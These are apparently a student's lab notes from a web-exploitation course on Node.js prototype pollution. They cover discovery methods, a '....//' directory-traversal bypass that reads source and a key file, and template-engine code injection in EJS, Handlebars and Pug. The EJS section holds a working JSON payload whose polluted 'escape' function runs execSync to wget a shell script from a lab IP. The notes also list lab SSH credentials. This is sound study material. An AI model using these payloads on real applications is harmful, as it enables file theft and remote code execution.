# Blackbox
- Prototype pollution is usually possible through serialization of a JSON payload, because it is not possible to directly pass javascript object within HTTP requests otherwise.
- It's important to keep in mind that blackbox techniques are abrasive and might lead to denial of service of the target application. Unlike reflected XSS, prototype pollution will continue affecting the target application until it is restarted.
- Not all prototype pollution vulnerabilities come from the ability to inject "__proto__" into a JSON object. Some may split a string with a period character ("file.name"), loop over the properties, and set the value to the contents. In these situations, other payloads like "constructor.prototype" would work instead of "__proto__". These types of vulnerabilities are more difficult to discover using blackbox techniques.  
Overwritting the **toString** function is one of the more reliable tests
# Whitebox
- Apparently using square brackets to access an array protects computed properties from prototype pollution, need to understand why.
- According to offsec prototype pollution is more likely to be found within a library the application uses rather than its source code.
  - of course this does not exclude an application's source code from code review but it is important to keep in mind in terms of low hanging fruit.
## searching for prototype pollution within an applications libraries
We would want to list an applications packages with:
```bash
npm list -prod -depth 1
```
Note that we limit the depth here to first order packages in the dependency tree since the further we get into the dependency tree the less likely it is for us to be able to reach that code from the application, e.g. low hanging fruit.

```bash
npm list -prod -depth 1 | grep "merge\|extend"
```
```powershell
npm list -prod -depth 1 | sls -Pattern "merge|extend"
```

Another and perhaps better way of searching for ***known*** vulnerabilities in an applications packages is by using npm audit.
```bash
npm audit
```
## extramiles
### 1
We can use the **hasOwnProperty** method to trigger another prototype pollution error.  
```json
"__proto__" : {
  "hasOwnProperty":"applesauce"
}
The most important thing I learned hhere was how to generate a list of suitable targets.  
In a browsers developer tools we can:
1. create a new **default** object
```javascript
let s = new Object
```
2. list out all of this objects properties
```
s.getownproperties()
```
3. the properties are
```
constructor
hasOwnProperty
isPrototypeOf
propertyIsEnumerable
toLocaleString
toString   
valueOf
```
### 2
The directory traversal is on the /files route.  
The intended behavior is to only allow downloading of files places within the **shared** directory.  
There is a trivial protection of filtering out **../** sequences to prevent file traversal which we can bypass with **....//**.  
Effectively the inner **../** gets stripped out.  
A request to download a file then looks like:  
```powershell
iwr -Uri http://chips/files/....//app.js -SkipHttpErrorCheck
```
pulling the encryption key:
```powershell
iwr -Uri http://chips/files/....//settings/clientOptions.json -SkipHttpErrorCheck
```
# Prototype Pollution Exploitation
- A useful prototype pollution exploit, ***in terms of RCE***, is application- and library-dependent. Ideally we want to find a point in the application where undefined variables are appended to a child_process.exec, eval, vm.runInNewContext function, or something like a templating engine.
- A useful prototype pollution exploit, ***in terms of the RBAC within WebAPP***, would allow us to overwrite a property such as **isAdmin** and thus grant ourselves admin privileges within the application itself.
# ejs
first this we must do is set ejs to be the template engine e.g.  
```
TEMPLATING_ENGINE=ejs docker-compose up
```
A better way with posh:  
```powershell
Import-Module Posh-SSH;
[string]$userName = 'student'
[string]$userPassword = 'studentlab'
[string]$machine = 'chips'
[securestring]$secStringPassword = ConvertTo-SecureString $userPassword -AsPlainText -Force
[pscredential]$credObject = New-Object System.Management.Automation.PSCredential ($userName, $secStringPassword)

$worker = New-SSHSession -ComputerName $machine -Credential $credObject
$worker
$result = Invoke-SSHCommand -Command 'docker-compose -f /home/student/chips/docker-compose.yml down && export TEMPLATING_ENGINE=ejs && docker-compose -f /home/student/chips/docker-compose.yml up -d' -SSHSession $worker
$result
iwr -Uri http://chips | sls -Pattern '<!-- Using EJS as Templating Engine -->' | % -process {$_.Matches.Value}
```
The main idea here is to dig into the source code of the template engine library and find the logic where the template is rendered. That is the ideal location to find a variable to pollute.

We can use get-ejs-esc-token.ps1 to get an rdp token that will trigger the esc error.  
The application internally uses a guaclite websocket tunnel to reach the **/guaclite** endpoint and it pulls the token from **window.location.search** so in order to reach it with standard http we would have use a headless browser in order to populate **window.location.search** by visiting **http://chips/rdp?token=blah&width=num&height=num** triggering the **rdp()** function in **/frontend/index.js**.  
Otherwise standard powershell requests to the guac endpoint are parsed by the files enpdpoint thus return 404.  
So instead we get an rdp token to trigger the **esc** error and paste that into burp where we have the **/guaclite** request.  
```
. ./get=ejs-esc-token.ps1
```

## ejs rce & extramile
### Exercises

Follow along with this section but connect to the remote debugger and observe the prototype pollution exploit.  
Obtain a shell.

### Extra Mile

Earlier, we used the escape variable to detect if the target is running EJS. We can also use this variable to obtain RCE with some additional payload modifications. Find how to obtain RCE by polluting the escape variable.

The one turned out to be pretty simple, really just had to use the debugger and step through the code line by line from the point of error.  
On line 625 in ***node_modules/ejs/lib/ejs.js*** there is the following logic:  
```js
if (opts.client) {
  src = 'escapeFn = escapeFn || ' + escapeFn.toString() + ';' + '\n' + src;
  if (opts.compileDebug) {
    src = 'rethrow = rethrow || ' + rethrow.toString() + ';' + '\n' + src;
  }
}
```
Basically by stepping through the code with the debugger, client was set to false so the proto pollution of ***escape*** completely jumped of this line of code.  
Naturally then I made the logic of the if statement evaluate to true by adding a ***client*** property.  
So the json payload looks like:  
```json
"__proto__" : {
  "client": "true",
  "escape":"function(x){process.mainModule.require('child_process').execSync('/usr/bin/wget http://192.168.119.154/shell.sh');}"
}
``` 
## handlebars rce & extramile
## exercises

Follow along with this section but connect to the remote debugger and observe the prototype pollution exploit.  

Why can we not reach RCE with the pendingContent exploit?  
The pendingContent variable is escaped
Obtain a working XSS with handlebars using the pendingContent exploit.  
The interesting thing here is that because the xss is through protoype pollution and the application is server side node js, its persistent until application is restarted.

Unset pendingContent to return to normal functionality.  

Extra Mile  

Switch to the Pug templating engine. Discover a mechanism to detect if the target is running Pug using prototype pollution. Using this mechanism, obtain XSS against the target.  

### Mapping out the library
- Main file: /node_modules/pug/lib/index.js
  - Code Generation: /node_modules/pug-code-gen/index.js
    - exports a function generateCode which calls the compiler function/class.
      - Compiler function takes an options argument which may be a proto pollution vector.
  - exports.render function on line 401
    - the render functions calls handleTemplateCache which calls exports.compile
  - exports.compile is defined on line 264
    - exports.compile calls compileBody
  - compileBody defined on line 77
    - this function builds the abstract syntax tree(ast)
      - this is accomplished by using load.string on line 82
    - line 197 begins the compulation phase where the template is turned into javascript, in particular this is where generateCode is called.
  - load function defined in /node_modules/pug-load/index.js, imported on line 18
    - load.string is just a wrapper over load.
    - interestingly this package uses assign from the object-assign library, so this is another potential vector of proto inj
  - Lexer: /node_modules/pug-lexer/index.js
    - the lexer seems to what will check for syntactic erros thus, this is likely to be the file with which we can debug erros
  - Customizing template compiliation: /node_modules/pug-attrs/index.js

After mapping out the application a bit my general plan is to play with render via:  
```js
docker-compose -f ~/chips/docker-compose.yml exec chips node --inspect=0.0.0.0:9228
```
In general the pug workflow is as such:
```js
pug = require("pug")
const compiledFunction = pug.compile('hello #{name}')
console.log(compiledFunction({name:'Donkey'}))
```
```
> pug = require("pug")
{
  name: 'Pug',
  runtime: {
    merge: [Function: pug_merge],
    classes: [Function: pug_classes],
    style: [Function: pug_style],
    attr: [Function: pug_attr],
    attrs: [Function: pug_attrs],
    escape: [Function: pug_escape],
    rethrow: [Function: pug_rethrow]
  },
  cache: {},
  filters: {},
  compile: [Function (anonymous)],
  compileClientWithDependenciesTracked: [Function (anonymous)],
  compileClient: [Function (anonymous)],
  compileFile: [Function (anonymous)],
  render: [Function (anonymous)],
  renderFile: [Function (anonymous)],
  compileFileClient: [Function (anonymous)],
  __express: [Function (anonymous)]
}
> const compiledFunction = pug.compile('hello #{name}')
undefined
> console.log(compiledFunction({name:'Donkey'}))
<hello>Donkey</hello>
undefined
globals: options.globals,
```
### Understanding options
https://pugjs.org/api/reference.html
### pollution
/node/modules/pug-walk/index.js:37 contains the pollution point.
Specifically we can pollute the block property.
Pug works as follows
lex produces tokens => parser takes the tokens and produces the abstract syntax tree => linker => walker(injection point here) => code generation

## handlebars shell
we can debug in interactive node with:
```js
Handlebars = require("handlebars")
ast = Handlebars.parse('{{someHelper "some string" 12345 true undefined null}}')
ast.body[0].params[1]
Handlebars.precompile(ast)
ast.body[0].params[1].value = "console.log('haxhaxhax')"
precompiled = Handlebars.precompile(ast)
eval("compiled = " + precompiled)
tem = Handlebars.template(compiled)
tem({})
```
The value we are interested in changed then is:
```js
ast.body[0].params[1].value = "console.log('haxhaxhax')"
```